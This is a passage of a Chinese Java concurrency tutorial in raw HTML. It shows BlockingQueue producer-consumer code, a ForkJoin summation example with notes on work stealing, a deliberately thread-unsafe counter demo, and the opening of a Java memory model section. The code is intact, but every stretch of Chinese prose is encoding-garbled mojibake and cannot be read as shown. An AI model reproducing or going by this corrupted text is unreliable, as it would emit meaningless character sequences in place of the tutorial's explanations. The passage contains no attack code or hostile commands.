ï¼šLinkedBlockingQueueã€ArrayBlockingQueueï¼ˆå›ºå®šé•¿åº¦ï¼‰</li><li><b>ä¼˜å…ˆçº§é˜Ÿåˆ—</b> ï¼šPriorityBlockingQueue</li></ul><p>æä¾›äº†é˜»å¡çš„ take() å’Œ put() æ–¹æ³•ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©º take() å°†é˜»å¡ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸­æœ‰å†…å®¹ï¼›å¦‚æœé˜Ÿåˆ—ä¸ºæ»¡ put() å°†é˜»å¡ï¼Œç›´åˆ°é˜Ÿåˆ—æœ‰ç©ºé—²ä½ç½®ã€‚</p><p><b>ä½¿ç”¨ BlockingQueue å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ProducerConsumer</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"n\">BlockingQueue</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">queue</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayBlockingQueue</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">5</span><span class=\"o\">);</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Producer</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">&#34;product&#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"s\">&#34;produce..&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Consumer</span> <span class=\"kd\">extends</span> <span class=\"n\">Thread</span> <span class=\"o\">{</span>\n\n        <span class=\"nd\">@Override</span>\n        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">String</span> <span class=\"n\">product</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">take</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"s\">&#34;consume..&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Producer</span> <span class=\"n\">producer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Producer</span><span class=\"o\">();</span>\n        <span class=\"n\">producer</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">5</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Consumer</span> <span class=\"n\">consumer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Consumer</span><span class=\"o\">();</span>\n        <span class=\"n\">consumer</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">3</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Producer</span> <span class=\"n\">producer</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Producer</span><span class=\"o\">();</span>\n        <span class=\"n\">producer</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">produce</span><span class=\"o\">..</span><span class=\"na\">produce</span><span class=\"o\">..</span><span class=\"na\">consume</span><span class=\"o\">..</span><span class=\"na\">consume</span><span class=\"o\">..</span><span class=\"na\">produce</span><span class=\"o\">..</span><span class=\"na\">consume</span><span class=\"o\">..</span><span class=\"na\">produce</span><span class=\"o\">..</span><span class=\"na\">consume</span><span class=\"o\">..</span><span class=\"na\">produce</span><span class=\"o\">..</span><span class=\"na\">consume</span><span class=\"o\">..</span></code></pre></div><h2>ForkJoin</h2><p>ä¸»è¦ç”¨äºå¹¶è¡Œè®¡ç®—ä¸­ï¼Œå’Œ MapReduce åŸç†ç±»ä¼¼ï¼Œéƒ½æ˜¯æŠŠå¤§çš„è®¡ç®—ä»»åŠ¡æ‹†åˆ†æˆå¤šä¸ªå°ä»»åŠ¡å¹¶è¡Œè®¡ç®—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ForkJoinExample</span> <span class=\"kd\">extends</span> <span class=\"n\">RecursiveTask</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">threshold</span> <span class=\"o\">=</span> <span class=\"n\">5</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">last</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ForkJoinExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">first</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">last</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">first</span> <span class=\"o\">=</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">last</span> <span class=\"o\">=</span> <span class=\"n\">last</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">Integer</span> <span class=\"nf\">compute</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">last</span> <span class=\"o\">-</span> <span class=\"n\">first</span> <span class=\"o\">&lt;=</span> <span class=\"n\">threshold</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// ä»»åŠ¡è¶³å¤Ÿå°åˆ™ç›´æ¥è®¡ç®—\n</span><span class=\"c1\"></span>            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">first</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">last</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                <span class=\"n\">result</span> <span class=\"o\">+=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// æ‹†åˆ†æˆå°ä»»åŠ¡\n</span><span class=\"c1\"></span>            <span class=\"kt\">int</span> <span class=\"n\">middle</span> <span class=\"o\">=</span> <span class=\"n\">first</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">last</span> <span class=\"o\">-</span> <span class=\"n\">first</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n            <span class=\"n\">ForkJoinExample</span> <span class=\"n\">leftTask</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ForkJoinExample</span><span class=\"o\">(</span><span class=\"n\">first</span><span class=\"o\">,</span> <span class=\"n\">middle</span><span class=\"o\">);</span>\n            <span class=\"n\">ForkJoinExample</span> <span class=\"n\">rightTask</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ForkJoinExample</span><span class=\"o\">(</span><span class=\"n\">middle</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">last</span><span class=\"o\">);</span>\n            <span class=\"n\">leftTask</span><span class=\"o\">.</span><span class=\"na\">fork</span><span class=\"o\">();</span>\n            <span class=\"n\">rightTask</span><span class=\"o\">.</span><span class=\"na\">fork</span><span class=\"o\">();</span>\n            <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">leftTask</span><span class=\"o\">.</span><span class=\"na\">join</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"n\">rightTask</span><span class=\"o\">.</span><span class=\"na\">join</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ExecutionException</span><span class=\"o\">,</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"n\">ForkJoinExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ForkJoinExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">10000</span><span class=\"o\">);</span>\n    <span class=\"n\">ForkJoinPool</span> <span class=\"n\">forkJoinPool</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ForkJoinPool</span><span class=\"o\">();</span>\n    <span class=\"n\">Future</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">forkJoinPool</span><span class=\"o\">.</span><span class=\"na\">submit</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">);</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">result</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n<span class=\"o\">}</span></code></pre></div><p>ForkJoin ä½¿ç”¨ ForkJoinPool æ¥å¯åŠ¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„çº¿ç¨‹æ± ï¼Œçº¿ç¨‹æ•°é‡å–å†³äº CPU æ ¸æ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ForkJoinPool</span> <span class=\"kd\">extends</span> <span class=\"n\">AbstractExecutorService</span></code></pre></div><p>ForkJoinPool å®ç°äº†å·¥ä½œçªƒå–ç®—æ³•æ¥æé«˜ CPU çš„åˆ©ç”¨ç‡ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤äº†ä¸€ä¸ªåŒç«¯é˜Ÿåˆ—ï¼Œç”¨æ¥å­˜å‚¨éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚å·¥ä½œçªƒå–ç®—æ³•å…è®¸ç©ºé—²çš„çº¿ç¨‹ä»å…¶å®ƒçº¿ç¨‹çš„åŒç«¯é˜Ÿåˆ—ä¸­çªƒå–ä¸€ä¸ªä»»åŠ¡æ¥æ‰§è¡Œã€‚çªƒå–çš„ä»»åŠ¡å¿…é¡»æ˜¯æœ€æ™šçš„ä»»åŠ¡ï¼Œé¿å…å’Œé˜Ÿåˆ—æ‰€å±çº¿ç¨‹å‘ç”Ÿç«äº‰ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒThread2 ä» Thread1 çš„é˜Ÿåˆ—ä¸­æ‹¿å‡ºæœ€æ™šçš„ Task1 ä»»åŠ¡ï¼ŒThread1 ä¼šæ‹¿å‡º Task2 æ¥æ‰§è¡Œï¼Œè¿™æ ·å°±é¿å…å‘ç”Ÿç«äº‰ã€‚ä½†æ˜¯å¦‚æœé˜Ÿåˆ—ä¸­åªæœ‰ä¸€ä¸ªä»»åŠ¡æ—¶è¿˜æ˜¯ä¼šå‘ç”Ÿç«äº‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e2d8c2f9c1492f875a419e037143dff6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"526\" data-rawheight=\"293\" class=\"origin_image zh-lightbox-thumb\" width=\"526\" data-original=\"https://pic3.zhimg.com/v2-e2d8c2f9c1492f875a419e037143dff6_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;526&#39; height=&#39;293&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"526\" data-rawheight=\"293\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"526\" data-original=\"https://pic3.zhimg.com/v2-e2d8c2f9c1492f875a419e037143dff6_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-e2d8c2f9c1492f875a419e037143dff6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ä¹ã€çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹</h2><p>å¦‚æœå¤šä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªå…±äº«æ•°æ®è¿›è¡Œè®¿é—®è€Œä¸é‡‡å–åŒæ­¥æ“ä½œçš„è¯ï¼Œé‚£ä¹ˆæ“ä½œçš„ç»“æœæ˜¯ä¸ä¸€è‡´çš„ã€‚</p><p>ä»¥ä¸‹ä»£ç æ¼”ç¤ºäº† 1000 ä¸ªçº¿ç¨‹åŒæ—¶å¯¹ cnt æ‰§è¡Œè‡ªå¢æ“ä½œï¼Œæ“ä½œç»“æŸä¹‹åå®ƒçš„å€¼æœ‰å¯èƒ½å°äº 1000ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ThreadUnsafeExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">add</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">threadSize</span> <span class=\"o\">=</span> <span class=\"n\">1000</span><span class=\"o\">;</span>\n    <span class=\"n\">ThreadUnsafeExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ThreadUnsafeExample</span><span class=\"o\">();</span>\n    <span class=\"kd\">final</span> <span class=\"n\">CountDownLatch</span> <span class=\"n\">countDownLatch</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CountDownLatch</span><span class=\"o\">(</span><span class=\"n\">threadSize</span><span class=\"o\">);</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">threadSize</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">();</span>\n            <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">countDown</span><span class=\"o\">();</span>\n        <span class=\"o\">});</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">997</span></code></pre></div><h2>åã€Java å†…å­˜æ¨¡å‹</h2><p>Java å†…å­˜æ¨¡å‹è¯•å›¾å±è”½å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ï¼Œä»¥å®ç°è®© Java ç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœã€‚</p><h2>ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜</h2><p>å¤„ç†å™¨ä¸Šçš„å¯„å­˜å™¨çš„è¯»å†™çš„é€Ÿåº¦æ¯”å†…å­˜å¿«å‡ ä¸ªæ•°é‡çº§ï¼Œä¸ºäº†è§£å†³è¿™ç§é€Ÿåº¦çŸ›ç›¾ï¼Œåœ¨å®ƒä»¬ä¹‹é—´åŠ å…¥äº†é«˜é€Ÿç¼“å­˜ã€‚</p><p>åŠ å…¥é«˜é€Ÿç¼“å­˜å¸¦æ¥äº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼šç¼“å­˜ä¸€è‡´æ€§ã€‚å¦‚æœå¤šä¸ªç¼“å­˜å…±äº«åŒä¸€å—ä¸»å†…å­˜åŒºåŸŸï¼Œé‚£ä¹ˆå¤šä¸ªç¼“å­˜çš„æ•°æ®å¯èƒ½ä¼šä¸ä¸€è‡´ï¼Œéœ€è¦ä¸€äº›åè®®æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-c231562d937b796c26b9ad7075936b3e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"999\" data-rawheight=\"538\" class=\"origin_image zh-lightbox-thumb\" width=\"999\" data-original=\"https://pic3.zhimg.com/v2-c231562d937b796c26b9ad7075936b3e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;999&#39; height=&#39;538&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"999\" data-rawheight=\"538\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"999\" data-original=\"https://pic3.zhimg.com/v2-c231562d937b796c26b9ad7075936b3e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-c231562d937b796c26b9ad7075936b3e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ‰€æœ‰çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹è¿˜æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼Œå·¥ä½œå†…å­˜å­˜å‚¨åœ¨é«˜é€Ÿç¼“å­˜æˆ–è€…å¯„å­˜å™¨ä¸­ï¼Œä¿å­˜äº†è¯¥çº¿ç¨‹ä½¿ç”¨çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬æ‹·è´ã€‚</p><p>çº¿ç¨‹åªèƒ½ç›´æ¥æ“ä½œå·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œä¸åŒçº¿ç¨‹ä¹‹é—´çš„å˜é‡å€¼ä¼ é€’éœ€è¦é€šè¿‡ä¸»å†…å­˜æ¥å®Œæˆã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e38dd19eda24306081985d64c30da476_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"997\" data-rawheight=\"530\" class=\"origin_image zh-lightbox-thumb\" width=\"997\" data-original=\"https://pic3.zhimg.com/v2-e38dd19eda24306081985d64c30da476_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;997&#39; height=&#39;530&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"997\" data-rawheight=\"530\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"997\" data-original=\"https://pic3.zhimg.com/v2-e38dd19eda24306081985d64c30da476_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-e38dd19eda24306081985d64c30da476_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å†…å­˜é—´äº¤äº’æ“ä½œ</h2><p>Java å†…å­˜æ¨¡å‹å®šä¹‰äº† 8 ä¸ªæ“ä½œæ¥å®Œæˆä¸»å†…å­˜å’Œå·¥ä½œå†…å­˜çš„äº¤äº’æ“ä½œã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-94fe2e2b92fdac5d624ae5e9f6437564_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"749\" data-rawheight=\"264\" class=\"origin_image zh-lightbox-thumb\" width=\"749\" data-original=\"https://pic1.zhimg.com/v2-94fe2e2b92fdac5d624ae5e9f6437564_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;749&#39; height=&#39;264&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"749\" data-rawheight=\"264\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"749\" data-original=\"https://pic1.zhimg.com/v2-94fe2e2b92fdac5d624ae5e9f6437564_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-94fe2e2b92fdac5d624ae5e9f6437564_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>readï¼šæŠŠä¸€ä¸ªå˜é‡çš„å€¼ä»ä¸»å†…å­˜ä¼ è¾“åˆ°å·¥ä½œå†…å­˜ä¸­</li><li>loadï¼šåœ¨ read ä¹‹åæ‰§è¡Œï¼ŒæŠŠ read å¾—åˆ°çš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬ä¸­</li><li>useï¼šæŠŠå·¥ä½œå†…å­˜ä¸­ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“</li><li>assignï¼šæŠŠä¸€ä¸ªä»æ‰§è¡Œå¼•æ“æ¥æ”¶åˆ°çš„å€¼èµ‹ç»™å·¥ä½œå†…å­˜çš„å˜é‡</li><li>storeï¼šæŠŠå·¥ä½œå†…å­˜çš„ä¸€ä¸ªå˜é‡çš„å€¼ä¼ é€åˆ°ä¸»å†…å­˜ä¸­</li><li>writeï¼šåœ¨ store ä¹‹åæ‰§è¡Œï¼ŒæŠŠ store å¾—åˆ°çš„å€¼æ”¾å…¥ä¸»å†…å­˜çš„å˜é‡ä¸­</li><li>lockï¼šä½œç”¨äºä¸»å†…å­˜çš„å˜é‡</li><li>unlock</li></ul><h2>å†…å­˜æ¨¡å‹ä¸‰å¤§ç‰¹æ€§</h2><h3>1. åŸå­æ€§</h3><p>Java å†…å­˜æ¨¡å‹ä¿è¯äº† readã€loadã€useã€assignã€storeã€writeã€lock å’Œ unlock æ“ä½œå…·æœ‰åŸå­æ€§ï¼Œä¾‹å¦‚å¯¹ä¸€ä¸ª int ç±»å‹çš„å˜é‡æ‰§è¡Œ assign èµ‹å€¼æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯åŸå­æ€§çš„ã€‚ä½†æ˜¯ Java å†…å­˜æ¨¡å‹å…è®¸è™šæ‹Ÿæœºå°†æ²¡æœ‰è¢« volatile ä¿®é¥°çš„ 64 ä½æ•°æ®ï¼ˆlongï¼Œdoubleï¼‰çš„è¯»å†™æ“ä½œåˆ’åˆ†ä¸ºä¸¤æ¬¡ 32 ä½çš„æ“ä½œæ¥è¿›è¡Œï¼Œå³ loadã€storeã€read å’Œ write æ“ä½œå¯ä»¥ä¸å…·å¤‡åŸå­æ€§ã€‚</p><p>æœ‰ä¸€ä¸ªé”™è¯¯è®¤è¯†å°±æ˜¯ï¼Œint ç­‰åŸå­æ€§çš„ç±»å‹åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ä¸ä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚å‰é¢çš„çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹ä»£ç ä¸­ï¼Œcnt å±äº int ç±»å‹å˜é‡ï¼Œ1000 ä¸ªçº¿ç¨‹å¯¹å®ƒè¿›è¡Œè‡ªå¢æ“ä½œä¹‹åï¼Œå¾—åˆ°çš„å€¼ä¸º 997 è€Œä¸æ˜¯ 1000ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿è®¨è®ºï¼Œå°†å†…å­˜é—´çš„äº¤äº’æ“ä½œç®€åŒ–ä¸º 3 ä¸ªï¼šloadã€assignã€storeã€‚</p><p>ä¸‹å›¾æ¼”ç¤ºäº†ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å¯¹ cnt è¿›è¡Œæ“ä½œï¼Œloadã€assignã€store è¿™ä¸€ç³»åˆ—æ“ä½œæ•´ä½“ä¸Šçœ‹ä¸å…·å¤‡åŸå­æ€§ï¼Œé‚£ä¹ˆåœ¨ T1 ä¿®æ”¹ cnt å¹¶ä¸”è¿˜æ²¡æœ‰å°†ä¿®æ”¹åçš„å€¼å†™å…¥ä¸»å†…å­˜ï¼ŒT2 